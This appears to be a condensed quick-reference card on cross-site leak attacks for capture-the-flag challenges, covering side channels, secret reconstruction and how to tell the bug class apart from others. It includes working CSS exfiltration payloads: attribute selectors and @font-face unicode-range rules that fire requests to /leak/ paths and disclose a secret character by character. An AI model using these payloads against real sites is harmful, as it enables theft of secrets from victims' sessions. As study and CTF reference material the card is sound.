# Quick reference — the XS-leak field card

The one-page operational card — the whole class, condensed.

---

## The class in one line

A bot reads under the victim's session — the response is opaque but
a side-channel (frame-count, error, timing, cache, CSS-match,
server-state) leaks a bit or a character-set.

## The two sub-shapes

```
CLASSIC — the bot visits YOUR URL → your JS measures a side-channel
SEALED  — a fixed URL + script-blocked CSP → a declarative/server-state
          channel
the question: can ANY origin the bot reaches run one line of your JS?
```

## The channel inventory

```
CLASSIC:  frames.length | onload/onerror | timing | cache-probe |
          :visited | window.open | scrollHeight | resource-timing |
          history.length | DOM-timing
SEALED:   CSS selector → font/URL load | @font-face → char-set |
          LRU eviction → survivors | counter++ | one-shot token |
          rate-limit | 'last seen' | DOM-writeback
```

## The CSS oracle — the sealed workhorse

```css
body[secret^="ab"]{--m:url('/leak/ab')}
#trig{background-image:var(--m,none)}
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
#secret{font-family:x;display:block !important}
```

## The control pair — always

```css
body[secret]{--yes:url('/leak/YES')}
body[nosuchattr]{--no:url('/leak/NO')}
/* YES hits + NO doesn't → the channel works */
```

## The feasibility arithmetic

```
- secret's TTL → the whole leak+decode+submit fits
- request rate → the markers fit the rps cap
- bits/visit → a token=1, a recency=thousands, a CSS=a char-set
- char-set → a sorted/limited alphabet reduces the search
- the context → a flag-holder session, not a plain visitor
```

## The reconstruction

```
a sorted secret   → sort the char-set — the answer
an unsorted secret → an n-gram beam search
a boolean oracle  → a binary-search extend
a count oracle    → a length-first + a char-by-char
```

## The spend-order

```
the cheaper channels narrow the answer first — the one-shot token's
one bit is spent on the LAST narrowing.
```

## The falsifier

```
a sealed shape with no CSS oracle AND no server-state channel →
  a different class.
```

## The confirm

```
a channel that fires is a candidate — the confirm is the
reconstructed + VERIFIED secret (submit it, confirm acceptance).
```

## The confusables

```
a fetch READS bytes → web-cors | a WRITE → web-csrf
JS on the target → web-xss | a stored-resp → cache-poison
JSONP/postMessage → a real read primitive
the response is OPAQUE → web-xs-leaks (a measure)
```

## The per-surface channel-map

```
a secret in an attribute → CSS-selector
a secret in text → @font-face
a font-src wildcard → @font-face exfil
a redis LRU → eviction channel
a counter → counter channel
a one-shot token → single-use flag
an airgapped bot → server-state/write-back
a managed-policy bot → declarative/server-state
a JSDOM → DOM/timing/count only
```
